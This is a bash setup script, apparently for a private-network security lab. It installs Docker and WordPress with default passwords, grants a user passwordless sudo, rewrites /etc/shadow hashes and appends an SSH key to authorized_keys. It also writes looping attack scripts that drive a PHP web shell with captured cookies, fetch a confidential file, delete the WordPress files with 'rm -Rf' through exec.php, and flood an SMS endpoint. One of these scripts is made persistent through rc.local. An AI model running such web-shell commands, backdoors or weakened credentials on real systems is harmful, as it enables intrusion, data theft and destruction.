#!/bin/bash


user=ubuntu
if [ ! -e /home/$user ]; then
        groupadd -g 1002 $user
        useradd -u 1002 --gid 1002 -m -p $user $user
        echo "$user ALL=NOPASSWD: ALL" > /etc/sudoers.d/$user-passwd
	chmod 0440 /etc/sudoers.d/$user-passwd
	chmod 777 /home/$user
fi
echo "$user:$user" | chpasswd
sed -e 's/\$6$IaYObisx$WX0c.UqZ4I75cQQ0tj8vwRr2KR2c3buWIvKQnaAlHEZOf4WfJVuzpNTOrgfOTzYRYr21tCC2nBniaOwSIxIW9/$6$Rl7VwMRu$ucI662v3\/gYPRSo8jYNbNROMwauSB32d4wV.drM7hWIiuKWtA3LlpPxMGnxqyMlcM8NS.It9j2byPq.NXnEEn/i' /etc/shadow

sudo apt-get install -y \
    apt-transport-https \
    ca-certificates \
    curl \
    software-properties-common \
    iftop iotop

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"

sudo apt-get update
sudo apt-get install -y docker-ce

sudo curl -L "https://github.com/docker/compose/releases/download/1.11.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose


mkdir wordpress
cd wordpress
echo "
version: '2'

services:

  wordpress:
    restart: always
    image: wordpress
    ports:
      - 8080:80
    environment:
      WORDPRESS_DB_PASSWORD: example
    volumes:
      - ./html:/var/www/html

  mysql:
    volumes:
      - ./db-data:/var/lib/mysql
    restart: always
    image: mariadb
    environment:
      MYSQL_ROOT_PASSWORD: example
" >docker-compose.yml
docker pull mysql:latest
mkdir html
cp -a   /home/ubuntu/db-data .
sudo docker-compose up -d
cd


#cd
#cd wildfly
#docker build -t wildfly .
#docker run --restart=always --name wildfly-app -p 8071:8080 wildfly
#

echo "
192.168.33.10 leia
192.168.33.18 luke 
192.168.33.2 darth
192.168.33.3 anakin
192.168.33.19 qui-gon
" >> /etc/hosts


cd /home/ubuntu/watchmen 
docker-compose build
docker-compose up -d


echo "
while [ 1 ]; do  
	curl --silent http://192.168.33.10:8089/hack.php
	sleep 15
done" >> /home/ubuntu/e-web-blaster.bash
chmod 755 /home/ubuntu/e-web-blaster.bash


echo "
while [ 1 ]; do
        curl 'http://192.168.33.10:8097/phpshell.php' --silent -H 'Content-Type: multipart/form-data; boundary=---------------------------6807946391377154335840454577' -H 'Referer: http://192.168.33.10:8097/phpshell.php' -H 'Cookie: wordpress_logged_in_7e2524097b9101c9140d774867f84575=asd%7C1494190141%7C6jSZ1wA963cbgHWfZpS8juP25Y3Gk5Ak5Kf7Ay2bHLs%7C6e61dd28c570c19e7c64971f6308e06eaff0354fa9f0bda48845b0385228333d; wp-settings-time-1=1492980543; PHPSESSID=934ca8cd680dde3a9f25b05f88af1b8a' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-binary $'-----------------------------6807946391377154335840454577\r\n\r\nContent-Disposition: form-data; name="levelup"\r\n\r\n\r\n-----------------------------6807946391377154335840454577\r\n\r\nContent-Disposition: form-data; name="changedirectory"\r\n\r\n\r\n-----------------------------6807946391377154335840454577\r\n\r\nContent-Disposition: form-data; name="username"\r\n\r\nuser\r\n-----------------------------6807946391377154335840454577\r\n\r\nContent-Disposition: form-data; name="password"\r\n\r\npassword\r\n-----------------------------6807946391377154335840454577\r\n\r\nContent-Disposition: form-data; name="nounce"\r\n\r\n1784941351\r\n-----------------------------6807946391377154335840454577--\r\n' -c cookie.jar -b cookie.jar
curl 'http://192.168.33.10:8098/phpshell.php' --silent -H 'Cookie: wordpress_logged_in_7e2524097b9101c9140d774867f84575=asd%7C1494190141%7C6jSZ1wA963cbgHWfZpS8juP25Y3Gk5Ak5Kf7Ay2bHLs%7C6e61dd28c570c19e7c64971f6308e06eaff0354fa9f0bda48845b0385228333d; wp-settings-time-1=1492980543; PHPSESSID=934ca8cd680dde3a9f25b05f88af1b8a' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-binary $'-----------------------------1405172573753353538835402218\r\n\r\nContent-Disposition: form-data; name=levelup\r\n\r\n\r\n-----------------------------1405172573753353538835402218\r\n\r\nContent-Disposition: form-data; name=changedirectory\r\n\r\n\r\n-----------------------------1405172573753353538835402218\r\n\r\nContent-Disposition: form-data; name=output\r\n\r\n\r\n-----------------------------1405172573753353538835402218\r\n\r\nContent-Disposition: form-data; name=command\r\n\r\nls /host/home/ubuntu/wordpress/html/\r\n-----------------------------1405172573753353538835402218\r\n\r\nContent-Disposition: form-data; name=rows\r\n\r\n24\r\n-----------------------------1405172573753353538835402218\r\n\r\nContent-Disposition: form-data; name=columns\r\n\r\n80\r\n-----------------------------1405172573753353538835402218--\r\n' -c cookie.jar -b cookie.jar

        curl 'http://192.168.33.10:8097/confidential.txt'
        sleep 15
done" > /home/ubuntu/force-pike.bash
chmod 755 /home/ubuntu/force-pike.bash

echo "
NOUNCE=$(curl 'http://192.168.33.10:8098/phpshell.php' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryefwzt4b3OpiNEEa7' --data-binary $'------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="levelup"\r\n\r\n\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="changedirectory"\r\n\r\n\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="username"\r\n\r\nuser\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="password"\r\n\r\npassword\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="nounce"\r\n\r\n1024570221\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7--\r\n' --cookie-jar /tmp/php-shell-cookiejar -j | grep ounce | sed 's/.*value="//' | sed 's/".*//') > /dev/null
curl 'http://192.168.33.10:8098/phpshell.php' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryefwzt4b3OpiNEEa7' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://192.168.30.2:25/index.php' -H 'Connection: keep-alive' --data-binary $'------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="levelup"\r\n\r\n\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="changedirectory"\r\n\r\n\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="username"\r\n\r\nuser\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="password"\r\n\r\npassword\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7\r\nContent-Disposition: form-data; name="nounce"\r\n\r\n'$NOUNCE'\r\n------WebKitFormBoundaryefwzt4b3OpiNEEa7--\r\n' --cookie-jar /tmp/php-shell-cookiejar  --cookie /tmp/php-shell-cookiejar > /dev/null
curl 'http://192.168.33.10:8098/exec.php?command=rm%20-Rf%20%2Fhost%2Fhome%2Fubuntu%2Fwordpress%2Fhtml%2F*'
" > /home/ubuntu/22lr.bash
chmod 755 /home/ubuntu/22lr.bash
echo /home/ubuntu/e-web-blaster.bash >> /etc/rc.local

cd 
echo "
while [ 1 ]; do
	curl --data 'sms=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' http://192.168.33.10:3000/sms
	sleep 10
done" > /home/ubuntu/A280.bash
chmod 755 /home/ubuntu/A280.bash


apt-get install -y iperf

echo "
[Unit]
Description=/usr/bin/iperf server

[Service]
ExecStart=/usr/bin/iperf -s -p 5210 -u
" >  /lib/systemd/system/iperf.service
systemctl enable iperf.service
systemctl start iperf.service



echo "
curl -s 'http://leia:8056/'" > /home/ubuntu/bowCaster.bash
chmod 755 /home/ubuntu/bowCaster.bash

echo "
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjqSq3uTT/b30pdp4mVyvJXd89G77cls+jtFWkRRZjL6qM3yT+yocmeFHgWiv+OrIQGjg9KFrvprIyIqmfYRqq8OWzzyGFr7ZV6rSc3LrY4jj99kJMiN2oR1tXtWbiJMGsMIXjwfGQfUTAYDht8EEo1dgwuuslyjy56X7/UnKNclpYT2XDZu42+1s5o/QxAFH6MsLWUSBWn8qeEVjGuMiqqAIyK+SnEt9n+9UEDlXFEZ7niKKeNLmhFC3r6cNYIPmzlnRx5oTZRO3O9WQE5WEM8EIcpmvkqVLEJc9BAoPtvnF9g6sOwAuAkR/2+alaQvQtVeHnDBZm4YTjHrui3AjD ubuntu@darth
" >> /home/ubuntu/.ssh/authorized_keys

